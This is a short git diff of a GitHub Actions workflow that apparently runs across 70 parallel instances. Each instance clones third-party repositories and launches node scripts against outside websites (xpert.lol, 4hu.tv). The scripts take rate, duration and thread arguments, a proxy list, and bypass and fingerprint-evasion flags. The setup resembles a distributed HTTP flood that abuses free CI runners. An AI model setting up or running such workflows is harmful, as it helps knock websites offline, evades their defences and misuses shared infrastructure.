@@ -40,11 +40,11 @@ jobs:
           git clone https://github.com/Fegp1p2/ideal-guide.git
           cd ideal-guide
           unzip Fc-main 
-          mv Fc-main/proxy.txt proxy.txt
+          cd Fc-main 
           git clone https://github.com/Ggeg111/curly-octo-doodle.git
           mv curly-octo-doodle/m.js op.js
           
-          node op.js https://xpert.lol/6622811674-15d10e6b-2398-477f-b5b0-f4c0e4dd19ba 400 90 4 proxy.txt --all-bypass --all-fingerprint --all-full
+          node y.js GET  https://4hu.tv/home/ 400 4 90 --bfw --debug --full 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
